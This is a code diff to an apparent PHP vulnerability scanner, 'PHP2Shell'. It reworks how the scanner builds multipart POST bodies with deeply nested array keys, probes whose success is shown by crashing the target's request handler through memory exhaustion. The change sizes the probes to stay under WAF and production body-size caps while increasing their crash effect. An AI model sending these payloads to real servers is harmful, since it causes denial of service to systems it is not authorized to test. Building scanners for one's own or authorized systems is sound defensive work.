@@ -58,7 +58,10 @@ DEFAULT_USER_AGENT = (
     "Safari/537.36 PHP2Shell/1.0.0"
 )
 
-PROBES = ((1, 4000), (8, 1020), (20, 1020))
+PART_DENSITY = 0.875          # fraction of the body that is real multipart parts
+MIN_PROBE_BYTES = 64 << 10    # floor for any single probe
+MAX_PROBE_BYTES = 32 << 20    # hard ceiling callers may request
+DEFAULT_MAX_PROBE_BYTES = 2 << 20  # default ceiling; fits strict prod/WAF caps
 REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
 FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
 VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
@@ -193,9 +196,9 @@ def phpmyadmin_target(target_url: str) -> str:
     return urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))
 
 
-@lru_cache(maxsize=len(PROBES))
-def build_probe_body(size_mib: int, parts: int) -> bytes:
-    size = size_mib << 20
+@lru_cache(maxsize=32)
+def build_probe_body(size_bytes: int, parts: int) -> bytes:
+    size = size_bytes
     name = b"a[]" + (b"[a]" * NESTED_KEYS)
     part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
     base = part * parts
@@ -207,6 +210,33 @@ def build_probe_body(size_mib: int, parts: int) -> bytes:
     filler = (size - len(base)) // 3
     body = b"--\n" + (b"x:\n" * filler) + base[3:]
     return body[:-1]
+
+
+def _bytes_per_part() -> int:
+    name = b"a[]" + (b"[a]" * NESTED_KEYS)
+    return len(b"--\nContent-Disposition:name=" + name + b";filename=\n\n")
+
+
+def build_probe_ladder(max_bytes: int) -> Tuple[Tuple[int, int], ...]:
+    """Smallest-first probe ladder up to ``max_bytes``.
+
+    Escalates part density (parts scale with size at a fixed ~87% density)
+    rather than padding with filler, so every probe stays under the ceiling
+    while raising the memory-exhaustion multiplier. Returns (size_bytes, parts).
+    """
+    ceiling = max(MIN_PROBE_BYTES, min(int(max_bytes), MAX_PROBE_BYTES))
+    per_part = _bytes_per_part()
+    steps: List[Tuple[int, int]] = []
+    for fraction in (0.25, 0.5, 1.0):
+        size = max(MIN_PROBE_BYTES, int(ceiling * fraction))
+        parts = max(1, int(size * PART_DENSITY / per_part))
+        step = (size, parts)
+        if step not in steps:
+            steps.append(step)
+    return tuple(steps)
+
+
+PROBES = build_probe_ladder(DEFAULT_MAX_PROBE_BYTES)
 
 
 def request_headers(custom_headers: Dict[str, str], boundary: str) -> Dict[str, str]:
@@ -764,6 +794,7 @@ def check_url(
     verify_ssl: bool,
     custom_headers: Dict[str, str],
     sapi: str,
+    max_bytes: int = DEFAULT_MAX_PROBE_BYTES,
 ) -> dict:
     result = base_result(host)
     result["tested_url"] = target_url
@@ -832,8 +863,10 @@ def check_url(
     rejected = False
     rejected_reason = None
 
-    for index, (size_mib, parts) in enumerate(PROBES, start=1):
-        body = build_probe_body(size_mib, parts)
+    ladder = build_probe_ladder(max_bytes)
+    for index, (size_bytes, parts) in enumerate(ladder, start=1):
+        size_mib = size_bytes / (1 << 20)
+        body = build_probe_body(size_bytes, parts)
         probe_headers = request_headers(custom_headers, PROBE_BOUNDARY)
         probe = send_post(
             target_url,
@@ -844,13 +877,15 @@ def check_url(
             verify_ssl,
         )
         probe_metadata = response_metadata(probe)
-        probe_metadata.update({"probe": index, "size_mib": size_mib, "parts": parts})
+        probe_metadata.update(
+            {"probe": index, "size_mib": round(size_mib, 3), "parts": parts}
+        )
         result["probes"].append(probe_metadata)
         result["request"] = request_dump(
             target_url,
             probe_headers,
             len(body),
-            f"php2shell probe {index}: {size_mib} MiB, {parts} parts, "
+            f"php2shell probe {index}: {size_mib:.2f} MiB, {parts} parts, "
             f"{NESTED_KEYS} nested keys",
         )
         apply_response(result, probe)
@@ -870,8 +905,9 @@ def check_url(
         if probe.status_code in REJECTED_STATUSES:
             rejected = True
             rejected_reason = (
-                f"probe {index} was rejected with HTTP {probe.status_code} "
-                "before PHP parsed it"
+                f"body-size limit detected: probe {index} ({size_mib:.2f} MiB) "
+                f"rejected with HTTP {probe.status_code} before PHP parsed it; "
+                "raise the ceiling only for an authorized, permissive target"
             )
             break
 
@@ -881,7 +917,7 @@ def check_url(
             result["verdict"] = "VULNERABLE"
             result["sapi"] = detected_sapi
             result["reason"] = (
-                f"probe {index} ({size_mib} MiB, {parts} parts) crashed the "
+                f"probe {index} ({size_mib:.2f} MiB, {parts} parts) crashed the "
                 f"request handler: {signal}"
             )
             return result
@@ -932,6 +968,7 @@ def check_vulnerability(
     custom_headers: Optional[Dict[str, str]] = None,
     sapi: str = "auto",
     paths: Optional[List[str]] = None,
+    max_bytes: int = DEFAULT_MAX_PROBE_BYTES,
 ) -> dict:
     display_host = safe_url_label(host)
     try:
@@ -955,6 +992,7 @@ def check_vulnerability(
             verify_ssl,
             custom_headers or {},
             sapi,
+            max_bytes,
         )
         if result["vulnerable"] is True:
             return result
